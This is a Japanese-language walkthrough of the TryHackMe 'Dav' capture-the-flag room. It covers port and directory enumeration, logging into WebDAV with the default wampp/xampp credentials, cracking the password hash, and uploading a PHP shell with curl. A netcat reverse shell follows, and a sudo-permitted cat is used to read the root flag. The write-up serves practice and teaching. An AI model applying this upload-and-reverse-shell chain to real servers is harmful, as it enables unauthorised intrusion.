# Dav CTF

https://tryhackme.com/r/room/bsidesgtdav

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-66-157:~# TARGET=10.10.36.128
root@ip-10-10-66-157:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-28 08:36 GMT
Nmap scan report for 10.10.36.128
Host is up (0.00026s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:CA:BC:BC:53:2D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds

root@ip-10-10-66-157:~# sudo nmap -sV -p80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-28 08:36 GMT
Nmap scan report for 10.10.36.128
Host is up (0.00010s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:CA:BC:BC:53:2D (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
```

80 http だけ。Apacheのデフォルト画面が表示される。

### gobuster

```shell
root@ip-10-10-66-157:~# gobuster dir -x txt,php,jpg,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.128
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,jpg,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 11321]
/.html                (Status: 403) [Size: 292]
/webdav               (Status: 401) [Size: 459]
/.html                (Status: 403) [Size: 292]
/.php                 (Status: 403) [Size: 291]
/server-status        (Status: 403) [Size: 300]
Progress: 1102785 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```

## エクスプロイト

```shell
msf6 exploit(windows/http/xampp_webdav_upload_php) > show options

Module options (exploit/windows/http/xampp_webdav_upload_php):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    10.10.36.128     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host
```

このエクスプロイトではなぜかシェルを取得できなかったが、  
エクスプロイトのデフォルトに設定されていた wampp / xampp を使って、/webdav/にログインできた。  
index ページが表示される。

/webdav/passwd.dav の内容
```text
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

hashcatでクラック
```shell
D:\tools\hashcat-6.2.6>hashcat -m 1600  hash.txt SecLists\Passwords\xato-net-10-million-passwords-1000000.txt
...
$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91:xampp
```

意味なし！

### Webdavファイルアップロード
```shell
$ curl -u wampp:xampp -T 'shell.php' 'http://10.10.36.128/webdav/'
```

ブラウザでshell.phpを表示

```shell
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.36.128] 37232
bash: cannot set terminal process group (712): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/webdav$ whoami
whoami
www-data

www-data@ubuntu:/var/www/html/webdav$ ls -al /home
ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Aug 25  2019 .
drwxr-xr-x 22 root   root   4096 Aug 25  2019 ..
drwxr-xr-x  4 merlin merlin 4096 Aug 25  2019 merlin
drwxr-xr-x  2 wampp  wampp  4096 Aug 25  2019 wampp

www-data@ubuntu:/var/www/html/webdav$ ls -al /home/wampp                            
ls -al /home/wampp
total 20
drwxr-xr-x 2 wampp wampp 4096 Aug 25  2019 .
drwxr-xr-x 4 root  root  4096 Aug 25  2019 ..
-rw-r--r-- 1 wampp wampp  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 wampp wampp 3771 Aug 25  2019 .bashrc
-rw-r--r-- 1 wampp wampp  655 Aug 25  2019 .profile

www-data@ubuntu:/var/www/html/webdav$ ls -al /home/merlin
ls -al /home/merlin
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt

www-data@ubuntu:/var/www/html/webdav$ cat /home/merlin/user.txt
cat /home/merlin/user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

user.txt ゲット！

### 権限昇格
```shell
www-data@ubuntu:/var/www/html/webdav$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/var/www/html/webdav$ sudo cat /root/root.txt

sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```

root.txt ゲット！

## 振り返り
- /webdav/passwd.dav は認証されていないと見られないし、認証された後だと役に立たない情報だし、どういうフローを期待されていたのか謎
- webdav の存在自体知らなかったし、ファイルアップロード方法も学べたのが収穫
